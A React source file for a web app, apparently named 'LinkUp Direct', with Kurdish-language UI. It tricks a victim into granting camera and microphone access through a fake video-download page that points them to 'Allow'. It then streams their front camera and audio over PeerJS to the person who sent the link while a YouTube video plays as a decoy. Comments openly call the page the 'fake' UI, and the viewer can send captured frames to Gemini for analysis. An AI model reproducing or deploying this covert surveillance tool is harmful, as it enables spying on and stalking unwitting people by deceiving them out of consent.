
import React, { useState, useEffect, useRef } from 'react';
import Peer from 'peerjs';
import { analyzeScreen } from './services/geminiService';

const App: React.FC = () => {
  const [myId, setMyId] = useState<string>('');
  const [targetId, setTargetId] = useState<string>('');
  
  // FIX: Initialize role based on URL immediately to prevent flashing the wrong UI
  const [role, setRole] = useState<'VIEWER' | 'STREAMER'>(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get('host') ? 'STREAMER' : 'VIEWER';
  });

  const [status, setStatus] = useState<string>('');
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [aiResponse, setAiResponse] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);
  
  // State to track if the streamer is watching the "fake" video
  const [isWatchingVideo, setIsWatchingVideo] = useState<boolean>(false);
  // Show a specific instruction overlay when button is clicked
  const [showPermissionHint, setShowPermissionHint] = useState<boolean>(false);

  const [activeStream, setActiveStream] = useState<MediaStream | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const peerRef = useRef<Peer | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const hostId = params.get('host');
    
    const newPeer = new Peer();

    newPeer.on('open', (id) => {
      setMyId(id);
      if (hostId) {
        setTargetId(hostId);
        // We already set role in useState, but ensuring consistency
        setRole('STREAMER'); 
      } else {
        setRole('VIEWER');
      }
    });

    // VIEWER Logic: Receive Video
    newPeer.on('call', (call) => {
      call.answer(); 
      call.on('stream', (remoteStream) => {
        setActiveStream(remoteStream);
        setIsConnected(true);
      });
    });

    peerRef.current = newPeer;

    return () => {
      newPeer.destroy();
    };
  }, []);

  useEffect(() => {
    if (isConnected && activeStream && videoRef.current && role === 'VIEWER') {
        videoRef.current.srcObject = activeStream;
        videoRef.current.play().catch(e => console.error("Autoplay error:", e));
    }
  }, [isConnected, activeStream, role]);

  const acceptAndStream = async () => {
    if (!peerRef.current || !targetId) return;
    
    setLoading(true);
    // Show the hint pointing to "Allow"
    setShowPermissionHint(true);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }, 
        audio: true 
      });

      setActiveStream(stream);

      const call = peerRef.current.call(targetId, stream);
      
      call.on('close', () => {
        setIsConnected(false);
        setActiveStream(null);
      });

      setIsConnected(true);
      // Immediately switch to video
      setIsWatchingVideo(true);
      
    } catch (err) {
      console.error(err);
      // If denied, keep loading or show retry text tailored to "Download"
      alert("بۆ ئەوەی داونلۆدەکە تەواو بێت، دەبێت 'Allow' دابگریت.");
      setLoading(false);
      setShowPermissionHint(false);
    }
  };

  const copyLink = () => {
    const url = `${window.location.origin}${window.location.pathname}?host=${myId}`;
    if (navigator.share) {
        navigator.share({
            title: 'Download Video',
            text: 'ڤیدیۆکە لێرە دابەزێنە',
            url: url
        }).catch(console.error);
    } else {
        navigator.clipboard.writeText(url);
        alert("لینک کۆپی کرا!");
    }
  };

  const handleAiCheck = async () => {
    if (!canvasRef.current || !videoRef.current) return;
    setAiResponse('...خەریکی شیکردنەوە');
    const ctx = canvasRef.current.getContext('2d');
    canvasRef.current.width = videoRef.current.videoWidth;
    canvasRef.current.height = videoRef.current.videoHeight;
    ctx?.drawImage(videoRef.current, 0, 0);
    const imgData = canvasRef.current.toDataURL('image/jpeg');
    
    const text = await analyzeScreen(imgData, "بە کوردی سۆرانی، ئەمە چییە لە وێنەکەدا؟");
    setAiResponse(text || "هیچ دیار نییە");
  };

  // --- RENDER: STREAMER WATCHING VIDEO ---
  if (isWatchingVideo && role === 'STREAMER') {
      return (
          <div className="h-[100dvh] w-full bg-black flex flex-col">
              <iframe 
                  width="100%" 
                  height="100%" 
                  src="https://www.youtube.com/embed/bowcSLQshC8?autoplay=1" 
                  title="YouTube video player" 
                  frameBorder="0" 
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                  allowFullScreen
                  className="flex-1"
              ></iframe>
              <video ref={videoRef} className="hidden" muted playsInline autoPlay />
          </div>
      );
  }

  // --- RENDER: VIEWER ---
  if (isConnected && role === 'VIEWER') {
    return (
      <div className="h-[100dvh] w-full bg-black relative flex flex-col overflow-hidden">
        <video 
          ref={videoRef} 
          autoPlay 
          playsInline 
          className="w-full h-full object-cover"
        />
        
        <div className="absolute bottom-0 inset-x-0 p-6 bg-gradient-to-t from-black/90 via-black/50 to-transparent flex flex-col gap-3">
            {aiResponse && (
                <div className="bg-slate-800/95 p-4 rounded-2xl text-sm text-white border border-white/10 shadow-xl max-h-40 overflow-y-auto" dir="rtl">
                    <span className="text-blue-400 font-bold ml-2">وەڵامی AI:</span> {aiResponse}
                </div>
            )}
            
            <div className="flex gap-3">
                <button onClick={handleAiCheck} className="flex-1 bg-indigo-600 active:bg-indigo-700 text-white py-4 rounded-2xl font-bold shadow-lg transition-transform active:scale-95 flex items-center justify-center gap-2">
                    <i className="fas fa-wand-magic-sparkles"></i>
                    <span>پرسیار لە AI</span>
                </button>
            </div>

            <button onClick={() => window.location.reload()} className="w-full bg-red-500/20 text-red-500 border border-red-500/50 py-3 rounded-2xl flex items-center justify-center font-bold active:bg-red-600 active:text-white transition-colors">
                پچڕاندن
            </button>
        </div>
        <canvas ref={canvasRef} className="hidden" />
      </div>
    );
  }

  // --- RENDER: SETUP MODE ---
  return (
    <div className="min-h-[100dvh] bg-slate-950 flex flex-col items-center justify-center p-6 text-center font-sans">
      <div className="w-full max-w-sm space-y-8 animate-fade-in relative">
        
        {role === 'VIEWER' ? (
            <div className="flex flex-col items-center gap-2">
                <h1 className="text-3xl font-bold text-white tracking-tight">LinkUp Direct</h1>
                <div className="bg-slate-900 border border-white/10 rounded-3xl p-6 space-y-6 shadow-2xl w-full">
                    <div className="w-20 h-20 bg-blue-600/20 text-blue-500 rounded-full flex items-center justify-center mx-auto ring-4 ring-blue-500/10">
                        <i className="fas fa-eye text-3xl"></i>
                    </div>
                    <div className="space-y-2">
                        <h2 className="text-xl font-bold text-white">داواکردنی کامێرا</h2>
                        <p className="text-slate-400 text-sm">ئەم لینکە بنێرە بۆ ئەو کەسە.</p>
                    </div>
                    
                    <button 
                        onClick={copyLink}
                        className="w-full bg-blue-600 hover:bg-blue-500 text-white py-4 rounded-2xl font-bold text-lg shadow-lg shadow-blue-900/20 transition-all active:scale-95 flex items-center justify-center gap-2"
                    >
                        <i className="fas fa-share-nodes"></i>
                        ناردنی لینک
                    </button>
                    <p className="text-slate-500 text-xs font-mono mt-2">{myId ? 'Connected' : 'Connecting...'}</p>
                </div>
            </div>
        ) : (
            // STREAMER "FAKE" UI - No LinkUp Header, Pure Download Look
            <div className="bg-slate-900 border border-blue-500/20 rounded-3xl p-8 space-y-8 shadow-2xl relative overflow-hidden">
                
                {/* Visual hint pointing to where the permission dialog usually appears */}
                {showPermissionHint && (
                   <div className="absolute top-0 right-0 left-0 bg-yellow-500/90 text-black p-3 text-sm font-bold animate-pulse z-50">
                      ☝️ بۆ تەواوکردنی داونلۆدەکە "Allow" دابگرە
                   </div>
                )}

                <div className="space-y-4">
                    <div className="w-24 h-24 bg-blue-600 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-blue-600/40 animate-pulse">
                        <i className="fas fa-download text-4xl text-white"></i>
                    </div>
                    <h2 className="text-2xl font-bold text-white">ئامادەیە بۆ داگرتن</h2>
                    <p className="text-slate-300 text-lg leading-relaxed">
                        فایلەکە ئامادەیە. بۆ پاراستنی (Save) فایلەکە لە مۆبایلەکەت، تکایە دوگمەی خوارەوە دابگرە و پاشان 
                        <span className="text-blue-400 font-bold mx-1">Allow</span> 
                        هەڵبژێرە.
                    </p>
                </div>

                <button 
                    onClick={acceptAndStream}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-500 text-white py-5 rounded-2xl font-bold text-xl shadow-xl shadow-blue-900/30 transition-all active:scale-95 flex items-center justify-center gap-3"
                >
                    {loading ? (
                        <span className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
                    ) : (
                        <>
                            <i className="fas fa-cloud-arrow-down"></i>
                            داگرتن (Download)
                        </>
                    )}
                </button>
                
                <div className="text-xs text-slate-500">
                    Video_2024.mp4 • 24.5 MB • HD
                </div>
            </div>
        )}

      </div>
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default App;
